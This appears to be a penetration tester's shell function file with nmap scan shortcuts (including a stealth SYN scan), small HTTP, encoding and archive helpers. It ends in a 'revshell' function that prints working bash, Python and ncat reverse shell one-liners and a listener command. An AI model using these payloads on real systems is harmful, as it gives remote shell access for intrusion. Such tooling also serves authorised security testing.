# Nmap shortcuts
nq()      { nmap -T4 -F "${1:-localhost}"; }
nfull()   { nmap -T4 -A -p- "${1:-localhost}"; }
nstealth(){ nmap -sS -T2 -p- "${1:-localhost}"; }

# HTTP server
serve() { python3 -m http.server "${1:-8080}"; }

# Base64
b64e() { echo -n "$1" | base64; }
b64d() { echo -n "$1" | base64 -d; }
sha()  { echo -n "$1" | sha256sum; }

# Extract any archive
extract() {
  case "$1" in
    *.tar.gz|*.tgz) tar -xzf "$1" ;;
    *.tar.bz2)      tar -xjf "$1" ;;
    *.zip)          unzip "$1" ;;
    *.7z)           7z x "$1" ;;
    *.gz)           gunzip "$1" ;;
    *.rar)          unrar x "$1" ;;
    *)              echo "Unknown: $1" ;;
  esac
}

# Quick port check
portcheck() { nmap -p "$1" "${2:-localhost}" 2>/dev/null | grep -E "open|closed|filtered"; }

# Reverse shell helper
revshell() {
  local ip="${1:-$(hostname -I | awk '{print $1}')}"
  local port="${2:-4444}"
  echo "\n[Reverse Shell Listeners]"
  echo "  bash:    bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo "  python:  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
  echo "  nc:      ncat $ip $port -e /bin/bash"
  echo "\n  Listener: ncat -lvnp $port"
}

